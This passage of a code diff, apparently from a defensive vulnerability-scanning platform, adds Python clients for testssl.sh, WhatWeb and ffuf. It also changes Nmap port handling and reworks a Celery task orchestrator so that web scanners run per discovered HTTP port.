+                if service is not None and service_name not in ("http", "https", "http-alt", "http-proxy"):
+                    servicefp = service.attrib.get("servicefp", "")
+                    if "HTTP/" in servicefp or "HTTP/" in extra_info:
+                        service_name = "http"
+                        if not service_product:
+                            service_product = "HTTP Service"
 
                 if service_product:
                     full_version = f"{service_product} {service_version}".strip()
@@ -46522,6 +47482,21 @@ def run_nmap_scan(asset_id: int, asset_ip: str) -> List[Dict]:
                             "scanner": "Nmap",
                             "ens_measure": "op.exp.2"
                         })
+                else:
+                    # Port is open but nmap could not identify the service (e.g. ppp? on 3000).
+                    # Emit a minimal finding so extract_http_ports can see this port in evidence.
+                    display_service = service_name if service_name and service_name != "ppp" else "unknown"
+                    findings.append({
+                        "title": f"Open Port: {port_id}/{protocol} (unrecognized service)",
+                        "severity": "INFO",
+                        "description": f"Port {port_id}/{protocol} is open on {asset_ip}. Service fingerprint unrecognized by Nmap.",
+                        "cve_id": None,
+                        "cvss_score": 0.0,
+                        "evidence": {"host": asset_ip, "port": port_id, "protocol": protocol, "service": display_service},
+                        "remediation": "Investigate what service is running on this port and verify it is intended.",
+                        "scanner": "Nmap",
+                        "ens_measure": "op.exp.2"
+                    })
 
                 for script in port.findall("script"):
                     script_id = script.attrib.get("id", "")
@@ -46554,6 +47529,26 @@ def run_nmap_scan(asset_id: int, asset_ip: str) -> List[Dict]:
     except Exception as e:
         logger.error(f"NMAP_ERROR: {e}")
         return []
+
+HTTP_SERVICE_NAMES = {"http", "http-alt", "http-proxy", "https", "www", "webcache"}
+HTTP_PORTS_ALWAYS = {80, 443, 3000, 8080, 8081, 8082, 8083, 8443, 8888, 9000}
+
+def extract_http_ports(nmap_findings: List[Dict]) -> List[int]:
+    """Return open HTTP ports inferred from nmap findings evidence fields."""
+    ports = set()
+    for f in nmap_findings:
+        evidence = f.get("evidence", {})
+        port_str = evidence.get("port", "")
+        service = evidence.get("service", "") or ""
+        try:
+            port = int(port_str)
+        except (ValueError, TypeError):
+            continue
+        if service.lower() in HTTP_SERVICE_NAMES or port in HTTP_PORTS_ALWAYS:
+            ports.add(port)
+    # Always include port 80 as baseline
+    ports.add(80)
+    return sorted(ports)
 FILE:services\scanner_engine\clients\nuclei_client.py
 """Nuclei CLI-based vulnerability scanner client."""
 
@@ -47105,6 +48100,235 @@ class OpenVastScanner:
             return {'status': 'error', 'message': str(e)}
         finally:
             db.close()
+FILE:services\scanner_engine\clients\testssl_client.py
+"""
+testssl Client - TLS/SSL Deep Analysis - Scanner Engine M3
+Detecta: BEAST, POODLE, Heartbleed, ROBOT, cipher suites débiles, versiones TLS inseguras.
+Cumple ENS Alto mp.com.2 (protección de comunicaciones).
+"""
+
+import subprocess
+import json
+import os
+import re
+from typing import List, Dict
+from urllib.parse import urlparse
+
+from shared.scan_logger import ScanLogger
+
+logger = ScanLogger("testssl_client")
+
+SEVERITY_MAP = {
+    "CRITICAL": "CRITICAL",
+    "HIGH": "HIGH",
+    "MEDIUM": "MEDIUM",
+    "LOW": "LOW",
+    "INFO": "INFO",
+    "NOT_TESTED": "INFO",
+}
+
+CVE_PATTERN = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)
+
+def _parse_target(target_url: str):
+    parsed = urlparse(target_url)
+    host = parsed.hostname or target_url
+    if parsed.scheme == "https":
+        port = parsed.port or 443
+    else:
+        port = parsed.port or 80
+    return host, port
+
+def _extract_cve(finding_text: str) -> str | None:
+    match = CVE_PATTERN.search(finding_text)
+    return match.group(0).upper() if match else None
+
+def run_testssl_scan(asset_id: int, target_url: str) -> List[Dict]:
+    logger.info("TESTSSL_START", target=target_url)
+    output_file = f"/tmp/testssl_output_{os.getpid()}.json"
+    target_host, port = _parse_target(target_url)
+
+    try:
+        cmd = [
+            "testssl.sh",
+            f"--jsonfile={output_file}",
+            "--quiet",
+            "--nodns", "min",
+            "--severity", "LOW",
+            f"{target_host}:{port}",
+        ]
+
+        subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+
+        findings = []
+        if os.path.exists(output_file):
+            with open(output_file, "r") as f:
+                try:
+                    raw = f.read().strip()
+                    if not raw:
+                        logger.warning("TESTSSL_EMPTY_OUTPUT", target=target_url)
+                        return []
+                    data = json.loads(raw)
+                    if isinstance(data, dict):
+                        items = data.get("findings", data.get("results", []))
+                    else:
+                        items = data
+
+                    for item in items:
+                        testssl_severity = item.get("severity", "INFO").upper()
+                        if testssl_severity == "OK":
+                            continue
+                        scanops_severity = SEVERITY_MAP.get(testssl_severity, "INFO")
+                        finding_text = item.get("finding", "")
+                        testssl_id = item.get("id", "unknown")
+                        cve_id = _extract_cve(finding_text)
+                        findings.append({
+                            "title": testssl_id.replace("_", " ").title(),
+                            "severity": scanops_severity,
+                            "description": finding_text,
+                            "cve_id": cve_id,
+                            "evidence": {
+                                "testssl_id": testssl_id,
+                                "finding": finding_text,
+                                "target": f"{target_host}:{port}",
+                            },
+                            "remediation": "Update TLS configuration: disable weak ciphers, enable TLS 1.2+, apply patches for known CVEs.",
+                            "ens_measure": "mp.com.2",
+                            "scanner": "testssl",
+                        })
+                except json.JSONDecodeError:
+                    logger.error("TESTSSL_JSON_ERROR", target=target_url)
+
+        logger.info("TESTSSL_FINISH", target=target_url, count=len(findings))
+        return findings
+
+    except subprocess.TimeoutExpired:
+        logger.error("TESTSSL_TIMEOUT", target=target_url)
+        return []
+    except FileNotFoundError:
+        logger.error("TESTSSL_NOT_FOUND", target=target_url)
+        return []
+    except Exception as e:
+        logger.error("TESTSSL_ERROR", target=target_url, error=str(e))
+        return []
+    finally:
+        if os.path.exists(output_file):
+            os.remove(output_file)
+FILE:services\scanner_engine\clients\whatweb_client.py
+"""
+WhatWeb Client - Technology Fingerprinting - Scanner Engine M3
+Identifica CMS, frameworks, servidores web y versiones para enriquecer el contexto de M8.
+"""
+
+import subprocess
+import json
+import os
+from typing import List, Dict
+
+from shared.scan_logger import ScanLogger
+
+logger = ScanLogger("whatweb_client")
+
+MEDIUM_SEVERITY_PLUGINS = {
+    "WordPress", "Joomla", "Drupal", "Laravel", "Django", "Rails",
+    "jQuery", "PHP", "Apache", "nginx",
+}
+
+def _extract_version(plugin_data) -> str | None:
+    if isinstance(plugin_data, list):
+        for entry in plugin_data:
+            if isinstance(entry, dict):
+                v = entry.get("version") or entry.get("string")
+                if v:
+                    return str(v)
+    if isinstance(plugin_data, dict):
+        return plugin_data.get("version") or plugin_data.get("string")
+    return None
+
+def _assign_severity(plugin_name: str, version) -> str:
+    if plugin_name in MEDIUM_SEVERITY_PLUGINS and version:
+        return "MEDIUM"
+    return "INFO"
+
+def run_whatweb_scan(asset_id: int, target_url: str) -> List[Dict]:
+    logger.info("WHATWEB_START", target=target_url)
+    output_file = f"/tmp/whatweb_output_{os.getpid()}.json"
+
+    try:
+        cmd = [
+            "whatweb",
+            f"--log-json={output_file}",
+            "--aggression=3",
+            "--quiet",
+            "--no-errors",
+            target_url,
+        ]
+
+        subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+
+        findings = []
+        if os.path.exists(output_file):
+            with open(output_file, "r") as f:
+                raw = f.read().strip()
+            if not raw:
+                logger.warning("WHATWEB_EMPTY_OUTPUT", target=target_url)
+                return []
+
+            parsed_entries = []
+            for line in raw.splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    parsed_entries.append(json.loads(line))
+                except json.JSONDecodeError:
+                    continue
+
+            if not parsed_entries:
+                try:
+                    fallback = json.loads(raw)
+                    if isinstance(fallback, list):
+                        parsed_entries = fallback
+                    elif isinstance(fallback, dict):
+                        parsed_entries = [fallback]
+                except json.JSONDecodeError:
+                    logger.warning("WHATWEB_NO_PARSEABLE_OUTPUT", target=target_url)
+                    return []
+
+            for entry in parsed_entries:
+                target = entry.get("target", target_url)
+                plugins = entry.get("plugins", {})
+                for plugin_name, plugin_data in plugins.items():
+                    version = _extract_version(plugin_data)
+                    severity = _assign_severity(plugin_name, version)
+                    title = f"Technology Detected: {plugin_name}"
+                    if version:
+                        title += f" {version}"
+                    findings.append({
+                        "title": title,
+                        "severity": severity,
+                        "description": "Technology fingerprint detected on target. Useful for M8 reasoning context.",
+                        "cve_id": None,
+                        "evidence": {"plugin": plugin_name, "version": version, "target": target},
+                        "remediation": "Hide version disclosure in HTTP headers and meta tags if not necessary.",
+                        "ens_measure": "op.exp.2",
+                        "scanner": "whatweb",
+                    })
+
+        logger.info("WHATWEB_FINISH", target=target_url, count=len(findings))
+        return findings
+
+    except subprocess.TimeoutExpired:
+        logger.error("WHATWEB_TIMEOUT", target=target_url)
+        return []
+    except FileNotFoundError:
+        logger.error("WHATWEB_NOT_FOUND", target=target_url)
+        return []
+    except Exception as e:
+        logger.error("WHATWEB_ERROR", target=target_url, error=str(e))
+        return []
+    finally:
+        if os.path.exists(output_file):
+            os.remove(output_file)
 FILE:services\scanner_engine\endpoints\__init__.py
 """FastAPI endpoints module"""
 FILE:services\scanner_engine\endpoints\scan.py
@@ -47181,6 +48405,9 @@ class ScannerTypeEnum(str, Enum):
     nmap = "nmap"
     nuclei = "nuclei"
     nikto = "nikto"
+    ffuf = "ffuf"
+    whatweb = "whatweb"
+    testssl = "testssl"
 
 class ScanRequest(BaseModel):
     """Request to start a vulnerability scan."""
@@ -48604,7 +49831,10 @@ from shared.database import SessionLocal
 from shared.scan_logger import ScanLogger
 from services.scanner_engine.models.vulnerability import VulnFinding
 from services.scanner_engine.services.nuclei_wrapper import run_nuclei_scan as execute_nuclei_binary
-from services.scanner_engine.clients.nmap_client import run_nmap_scan
+from services.scanner_engine.clients.nmap_client import run_nmap_scan, extract_http_ports
+from services.scanner_engine.clients.ffuf_client import run_ffuf_scan
+from services.scanner_engine.clients.whatweb_client import run_whatweb_scan
+from services.scanner_engine.clients.testssl_client import run_testssl_scan
 
 logger = ScanLogger("scanner_tasks")
 
@@ -48654,15 +49884,82 @@ def run_openvas_scan(asset_id: int, asset_ip: str, asset_name: str) -> List[Dict
         loop.close()
 
 @app.task(name="tasks.run_nikto_vulnerability_scan", queue="vulnerabilities")
-def run_nikto_task(asset_id: int, ip: str) -> List[Dict]:
+def run_nikto_task(asset_id: int, ip: str, port: int = 80) -> List[Dict]:
     from services.scanner_engine.clients.nikto_client import run_nikto_scan
-    logger.info("NIKTO_TASK_START", target=ip)
+    scheme = "https" if port == 443 else "http"
+    target_url = f"{scheme}://{ip}:{port}"
+    logger.info("NIKTO_TASK_START", target=target_url)
     try:
-        target_url = f"http://{ip}"
         findings = run_nikto_scan(asset_id, target_url)
-        return [{"scanner": "Nikto", **f} for f in findings]
+        tagged = []
+        for f in findings:
+            evidence = dict(f.get("evidence", {}))
+            evidence["port"] = str(port)
+            evidence["target"] = target_url
+            desc = f.get("description", "")
+            tagged.append({
+                **f,
+                "scanner": "Nikto",
+                "evidence": evidence,
+                "description": f"[Port {port}] {desc}" if f":{port}" not in desc else desc,
+            })
+        return tagged
     except Exception as e:
         logger.error("NIKTO_TASK_ERROR", error=str(e))
+        return []
+
+# --- TAREA: FFUF (endpoint fuzzing) ---
+@app.task(name="tasks.run_ffuf_scan", queue="vulnerabilities")
+def run_ffuf_task(asset_id: int, ip: str, port: int = 80) -> List[Dict]:
+    scheme = "https" if port == 443 else "http"
+    target_url = f"{scheme}://{ip}:{port}"
+    logger.info("FFUF_TASK_START", asset_id=asset_id, target=target_url)
+    try:
+        findings = run_ffuf_scan(asset_id, target_url)
+        tagged = []
+        for f in findings:
+            evidence = dict(f.get("evidence", {}))
+            evidence["port"] = str(port)
+            evidence["target"] = target_url
+            desc = f.get("description", "")
+            tagged.append({
+                **f,
+                "scanner": "ffuf",
+                "evidence": evidence,
+                "description": f"[Port {port}] {desc}" if f":{port}" not in desc else desc,
+            })
+        return tagged
+    except Exception as e:
+        logger.error("FFUF_TASK_ERROR", error=str(e))
+        return []
+
+# --- TAREA: WHATWEB (technology fingerprinting) ---
+@app.task(name="tasks.run_whatweb_scan", queue="vulnerabilities")
+def run_whatweb_task(asset_id: int, ip: str) -> List[Dict]:
+    logger.info("WHATWEB_TASK_START", asset_id=asset_id, target=ip)
+    try:
+        # Try HTTPS first (most modern servers), fall back to HTTP
+        https_findings = run_whatweb_scan(asset_id, f"https://{ip}")
+        if https_findings:
+            return [{"scanner": "whatweb", **f} for f in https_findings]
+        http_findings = run_whatweb_scan(asset_id, f"http://{ip}")
+        return [{"scanner": "whatweb", **f} for f in http_findings]
+    except Exception as e:
+        logger.error("WHATWEB_TASK_ERROR", error=str(e))
+        return []
+
+# --- TAREA: TESTSSL (TLS/SSL deep analysis) ---
+@app.task(name="tasks.run_testssl_scan", queue="vulnerabilities")
+def run_testssl_task(asset_id: int, ip: str) -> List[Dict]:
+    logger.info("TESTSSL_TASK_START", asset_id=asset_id, target=ip)
+    try:
+        # testssl always targets HTTPS; run_testssl_scan handles port extraction internally
+        findings = run_testssl_scan(asset_id, f"https://{ip}")
+        if not findings:
+            logger.info("TESTSSL_NO_FINDINGS_ON_443", target=ip)
+        return [{"scanner": "testssl", **f} for f in findings]
+    except Exception as e:
+        logger.error("TESTSSL_TASK_ERROR", error=str(e))
         return []
 
 # --- CALLBACK: MERGE & PERSIST (US-3.4) ---
@@ -48710,31 +50007,70 @@ def merge_and_persist_results(results_list: List[List[Dict]], asset_id: int):
     finally:
         db.close()
 
+@app.task(name="tasks.return_precomputed", queue="vulnerabilities")
+def return_precomputed(findings: List[Dict]) -> List[Dict]:
+    """Identity task — passes already-computed findings into a chord group."""
+    return findings
+
 # --- ORQUESTADOR PARALELO (US-3.4) ---
 @app.task(name="services.scanner_engine.tasks.vuln_tasks.scan_asset_parallel")
 def scan_asset_parallel(asset_id: int, asset_ip: str, asset_name: str, scan_types: List[str] = None):
     """
-    Lanza múltiples scanners en paralelo usando un Chord de Celery.
-    Nuclei || OpenVAS || Nikto -> merge_and_persist_results
+    Flujo en dos fases:
+      Fase 1 — Nmap (bloqueante): descubre puertos y servicios.
+      Fase 2 — Resto de scanners en paralelo. Nikto y ffuf se lanzan una vez
+                por cada puerto HTTP descubierto por Nmap.
     """
     if not scan_types:
         scan_types = ["nuclei", "nmap", "nikto"]
 
+    # --- Fase 1: Nmap ---
+    nmap_findings = []
+    if "openvas" in scan_types or "nmap" in scan_types:
+        logger.info("NMAP_PHASE_START", asset_id=asset_id, target=asset_ip)
+        try:
+            nmap_findings = run_nmap_scan(asset_id, asset_ip)
+        except Exception as e:
+            logger.error("NMAP_PHASE_ERROR", error=str(e))
+
+    http_ports = extract_http_ports(nmap_findings)
+    logger.info("HTTP_PORTS_DISCOVERED", asset_id=asset_id, ports=http_ports)
+
+    # --- Fase 2: resto de scanners ---
     tasks = []
+
+    # Nmap findings ya obtenidos en fase 1 — se pasan como lista directa al chord
+    # usando una tarea identity para que merge_and_persist_results los reciba igual
+    # que los demás resultados del grupo.
+    if nmap_findings:
+        tasks.append(return_precomputed.s(nmap_findings))
+
     if "nuclei" in scan_types:
         tasks.append(run_nuclei_task.s(asset_id, asset_ip, asset_name))
-    if "openvas" in scan_types or "nmap" in scan_types:
-        tasks.append(run_nmap_task.s(asset_id, asset_ip))
-    if "nikto" in scan_types:
-        tasks.append(run_nikto_task.s(asset_id, asset_ip))
+    if "openvas" in scan_types:
+        tasks.append(run_openvas_scan.s(asset_id, asset_ip, asset_name))
+
+    # Nikto y ffuf: una tarea por puerto HTTP descubierto
+    for port in http_ports:
+        if "nikto" in scan_types:
+            tasks.append(run_nikto_task.s(asset_id, asset_ip, port))
+        if "ffuf" in scan_types:
+            tasks.append(run_ffuf_task.s(asset_id, asset_ip, port))
+
+    if "whatweb" in scan_types:
+        tasks.append(run_whatweb_task.s(asset_id, asset_ip))
+    if "testssl" in scan_types:
+        tasks.append(run_testssl_task.s(asset_id, asset_ip))
 
     if not tasks:
+        # Solo nmap se ejecutó, persistir sus findings directamente
+        if nmap_findings:
+            return merge_and_persist_results([nmap_findings], asset_id)
         return {"status": "no_scans_selected"}
 
-    # Ejecutar en paralelo y llamar al callback al finalizar
     workflow = chord(group(tasks))(merge_and_persist_results.s(asset_id))
-
-    logger.info("PARALLEL_SCAN_ORCHESTRATED", asset_id=asset_id, scanners=scan_types, hostname=asset_name)
+    logger.info("PARALLEL_SCAN_ORCHESTRATED", asset_id=asset_id, scanners=scan_types,
+                http_ports=http_ports, hostname=asset_name)
     return {"status": "parallel_scans_initiated", "task_id": workflow.id}
 FILE:services\scanner_engine\tests\__init__.py
 """Scanner Engine tests module."""
@@ -52430,11 +53766,23 @@ def test_parallel_execution():
 FILE:shared\__init__.py
 """Shared utilities and base modules for ScanOPS microservices."""
 
-from .database import engine, SessionLocal, get_db, create_tables, drop_tables
-from .scan_logger import ScanLogger
 from .auth import get_current_user
-from .config import settings
-from .vault_client import vault_client
+from .scan_logger import ScanLogger
+
+try:
+    from .database import engine, SessionLocal, get_db, create_tables, drop_tables
+except Exception:
+    engine = SessionLocal = get_db = create_tables = drop_tables = None  # type: ignore
+
+try:
+    from .config import settings
+except Exception:
+    settings = None  # type: ignore
+
+try:
+    from .vault_client import vault_client
+except Exception:
+    vault_client = None  # type: ignore
 
 __all__ = [
     "engine",
